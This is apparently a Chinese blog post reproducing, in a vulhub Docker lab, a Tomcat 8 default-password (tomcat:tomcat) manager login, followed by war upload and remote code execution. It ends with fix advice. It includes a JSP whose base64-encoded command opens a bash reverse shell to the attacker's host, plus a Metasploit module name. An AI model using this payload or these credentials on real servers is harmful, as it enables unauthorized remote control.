---
layout: post
title: "Tomcat8 未授权访问漏洞复现"
date: 2022-01-24
author: 2hanx
toc: true
categories: [漏洞复现]
tags: ["Tomcat"]
---

### 漏洞介绍

在 Tomcat8 环境下默认进入后台的密码为 *tomcat:tomcat* ，未修改造成未授权访问后台，不过文章的侧重点在于部署 war 远程部署并反弹 shell。

### 漏洞危害

1. 弱口令；
2. 弱口令登录后台通过上传 war 包达到 RCE。

### 漏洞原理

在 tomcat8 环境下默认进入后台的密码为 *tomcat:tomcat* ，未修改造成未授权访问后台，配置文件：`/usr/local/tomcat/conf/tomcat-user.xml` 大致为：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">

    <role rolename="manager-gui"/>
    <role rolename="manager-script"/>
    <role rolename="manager-jmx"/>
    <role rolename="manager-status"/>
    <role rolename="admin-gui"/>
    <role rolename="admin-script"/>
    <user username="tomcat" password="tomcat" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />
    
</tomcat-users>
```

### 环境搭建

照例通过 vulhub 上的 docker 环境进行复现，使用 `docker-compose` 命令配置环境即可。

| 计算机 | IP                |
| ------ | ----------------- |
| Kali   | `192.168.174.128` |
| Win10  | `192.168.174.1`   |
| Victim | `192.168.174.141` |

### 漏洞复现

配置好环境后访问 Victim 的 *8080* 端口，看到 Tomcat 的版本是 **8.0.43**。

![1]({{ '/tomcat3/1.png' | prepend: site.url }})

接下来通过 *tomcat:tomcat* 弱口令登录后台，并上传 war 包。

![2]({{ '/tomcat3/2.png' | prepend: site.url }})

下一步就是使用 `jar` 工具将 jsp 脚本打包成 war 包，执行命令：`jar -cvf revshell.war ./revshell.jsp`

```jsp
<%
    java.io.InputStream in = Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE3NC4xMjgvODg4OCAwPiYx}|{base64,-d}|{bash,-i}").getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print("</pre>");
%>
```

一旦上传部署成功，就会在 *Applications* 处看到访问路径。

![3]({{ '/tomcat3/3.png' | prepend: site.url }})

此时 Kali 在监听 **8888** 端口后即可接收到反弹的 shell 。

![4]({{ '/tomcat3/4.png' | prepend: site.url }})

或者使用 MSF 的 `exploit/multi/http/tomcat_mgr_upload ` 模块

![5]({{ '/tomcat3/5.png' | prepend: site.url }})

### 修复建议

1. 修改 *tomcat-user.xml* 中的密码；
2. 升级最新版本。

### 总结

1. Tomcat 部署 war 包，并反弹 shell。

